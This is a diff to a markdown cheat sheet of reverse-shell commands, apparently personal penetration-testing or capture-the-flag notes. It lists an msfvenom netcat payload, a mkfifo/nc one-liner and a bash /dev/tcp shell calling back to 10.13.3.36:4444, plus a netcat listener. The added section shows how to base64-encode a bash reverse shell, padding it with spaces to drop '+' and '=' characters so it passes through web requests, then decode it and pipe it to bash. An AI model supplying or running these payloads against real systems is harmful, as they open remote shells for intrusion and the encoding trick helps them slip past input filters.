@@ -17,7 +17,21 @@
 ## Generate reverse ncat
 * `msfvenom -p cmd/unix/reverse_netcat lhost=10.13.3.36 lport=4444`
     * `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`
-* `bash -c 'bash -i >& /dev/tcp/10.13.3.36/4444 0>&1'`
+* Bash Reverse Shell
+    * `bash -c 'bash -i >& /dev/tcp/10.13.3.36/4444 0>&1'`
+    * Create one to send on the web
+```bash
+$ echo 'bash -i >& /dev/tcp/localhost/4444 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC9sb2NhbGhvc3QvNDQ0NCAwPiYxCg==
+
+# Add spaces to remove the + and =
+
+$ echo 'bash  -i >& /dev/tcp/localhost/4444 0>&1 ' | base64
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvbG9jYWxob3N0LzQ0NDQgMD4mMSAK
+
+# Send this as the payload
+$ echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvbG9jYWxob3N0LzQ0NDQgMD4mMSAK | base64 -d | bash
+```
 * Listener: `nc -klvnp 4444`
     * k - Wait for more connections after completion
     * l - Listen for connection
